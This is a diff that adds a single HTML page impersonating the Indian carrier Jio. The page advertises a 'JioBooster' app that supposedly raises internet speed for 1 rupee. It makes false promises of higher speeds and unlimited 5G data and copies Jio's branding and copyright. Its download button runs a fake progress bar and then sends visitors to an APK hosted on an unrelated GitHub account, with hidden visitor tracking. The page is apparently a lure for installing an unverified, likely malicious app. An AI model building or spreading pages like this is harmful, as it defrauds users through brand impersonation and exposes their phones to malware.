@@ -1,0 +1,241 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Jio HighSpeed Internet Booster</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: #f4f7fc;
+            text-align: center;
+            padding-bottom: 70px;
+        }
+
+        .top-bar {
+            background: #0f3cc9;
+            color: white;
+            padding: 16px 30px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .top-bar img {
+            height: 35px;
+        }
+
+        .header {
+            background: white;
+            padding: 15px 10px;
+            text-align: center;
+            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .header h1 {
+            font-size: 22px;
+            color: #000;
+            font-weight: 700;
+        }
+
+        .hero {
+    background: linear-gradient(to right, #eef2f6, #ffffff);
+    padding: 15px 10px;
+    box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1), 
+                0px -4px 8px rgba(0, 0, 0, 0.1); /* Shadow on both top & bottom */
+    text-align: center;
+}
+
+
+        .hero h1 {
+            font-size: 26px;
+            color: #000;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .hero h1 span {
+            color: #0f3cc9;
+        }
+
+        .hero p {
+            font-size: 16px;
+            color: #444;
+            margin-bottom: 10px;
+        }
+
+        .hero ul {
+            text-align: left;
+            max-width: 300px;
+            padding-left: 20px;
+            margin: 0 auto;
+        }
+
+        .hero ul li {
+            font-size: 15px;
+            margin-bottom: 6px;
+        }
+
+        .hero-image {
+            width: 150px;
+            margin-top: 20px;
+        }
+
+        .download-btn {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: #0f3cc9;
+            color: white;
+            padding: 15px;
+            font-size: 18px;
+            font-weight: 700;
+            text-align: center;
+            text-decoration: none;
+            transition: background 0.3s;
+        }
+
+        .download-btn:hover {
+            background: #0f3cc9;
+        }
+
+        footer {
+            background: #0f3cc9;
+            color: white;
+            padding: 12px;
+            font-size: 14px;
+            margin-top: 20px;
+        }
+
+        /* Progress Bar */
+        .progress-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .progress-container {
+            width: 120px;
+            height: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            background: conic-gradient(#0f3cc9 0deg, #ccc 0deg);
+            position: relative;
+        }
+
+        .progress-container::before {
+            content: "";
+            position: absolute;
+            width: 100px;
+            height: 100px;
+            background: white;
+            border-radius: 50%;
+        }
+
+        .progress-text {
+            position: absolute;
+            font-size: 16px;
+            font-weight: bold;
+            color: #0f3cc9;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="top-bar">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Jio_True_5G_Logo.svg/2560px-Jio_True_5G_Logo.svg.png" alt="Hotstar">
+        
+    </div>
+
+    <div class="header">
+        <h1>Jio Highspeed Internet Booster</h1>
+    </div>
+
+    <div class="hero">
+
+        <img src="https://static.toiimg.com/thumb/msid-119271341,imgsize-38302,width-400,resizemode-4/119271341.jpg" 
+             class="hero-image">
+
+        <h1>Jio Internet Speed Booster<br><span>at just 1-Rs</span></h1>
+        <p><strong>Key Benefits:</strong></p>
+        <ul>
+            <li>Jio Annonunces Internet Speed booster app.</li>
+            <li>Increase your Jio Internet speed<br>upto 120/MBPS.</li>
+            <li>Also enjoy Unlimited 5G-Data with high speed.</li>
+            <li>Download JioBooster app from below and boost your speed now.</li>
+        </ul>
+        
+    </div>
+
+    <a id="downloadButton" href="#" class="download-btn">Download app</a>
+
+    <footer>
+        &copy; 2025 Jio. All Rights Reserved.
+    </footer>
+
+    <!-- Progress Bar Overlay -->
+    <div class="progress-overlay" id="progressOverlay">
+        <div class="progress-container">
+            <div class="progress-text" id="progressText">0%</div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById("downloadButton").addEventListener("click", function (event) {
+            event.preventDefault();
+            let overlay = document.getElementById("progressOverlay");
+            let progressText = document.getElementById("progressText");
+
+            overlay.style.display = "flex";
+
+            let progress = 0;
+            let interval = setInterval(() => {
+                progress += 10;
+                progressText.innerText = progress + "%";
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        overlay.style.display = "none";
+                        window.location.href = "https://github.com/techglr/claim/raw/refs/heads/main/JioBooster.apk";
+                    }, 500);
+                }
+            }, 200);
+        });
+    </script>
+
+<script type="text/javascript">
+var sc_project=12889745; 
+var sc_invisible=1; 
+var sc_security="a51383de"; 
+</script>
+<script type="text/javascript"
+src="https://www.statcounter.com/counter/counter.js"
+async></script>
+<noscript><div class="statcounter"><a title="Web Analytics"
+href="https://statcounter.com/" target="_blank"><img
+class="statcounter"
+src="https://c.statcounter.com/12889745/0/a51383de/1/"
+alt="Web Analytics"
+referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
+</body>
+</html>
